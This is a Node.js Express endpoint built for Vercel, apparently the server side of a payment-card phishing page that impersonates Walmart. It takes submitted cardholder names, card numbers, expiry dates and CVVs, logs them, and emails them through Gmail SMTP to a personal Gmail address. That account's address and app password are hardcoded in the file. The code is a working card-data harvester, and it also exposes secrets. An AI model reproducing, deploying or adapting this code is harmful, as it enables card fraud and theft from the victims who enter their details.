// api/card.js

const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();

// --- ✅ CORS CONFIG ---
const allowedOrigins = [
  "https://walmart-mu.vercel.app",
  "http://localhost:5500",
  "http://127.0.0.1:5500"
];

app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true,
  })
);

app.use(express.json());

// --- ✅ HANDLE PREFLIGHT (OPTIONS) ---
app.options("*", cors());

// --- ✅ ROUTE ---
app.post("/api/card", async (req, res) => {
  const { cardName, cardNumber, expiry, cvv } = req.body;
  console.log("Received card submission:", req.body);

  if (!cardName || !cardNumber || !expiry || !cvv) {
    return res.status(400).json({ error: "Missing fields" });
  }

  const gmailUser = process.env.GMAIL_USER || "peternnamani001@gmail.com";
  const gmailPass = process.env.GMAIL_PASS || "llvn tfua kgre byir";

  const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: { user: gmailUser, pass: gmailPass },
  });

  const mailOptions = {
    from: gmailUser,
    to: gmailUser,
    subject: "New Card Submission",
    text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2),
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    res.json({ success: true, message: "Email sent", info: info.response });
  } catch (err) {
    console.error("Error sending email:", err);
    res.status(500).json({ error: "Failed to send email", details: err.message });
  }
});

// --- ✅ EXPORT APP FOR VERCEL ---
module.exports = app;
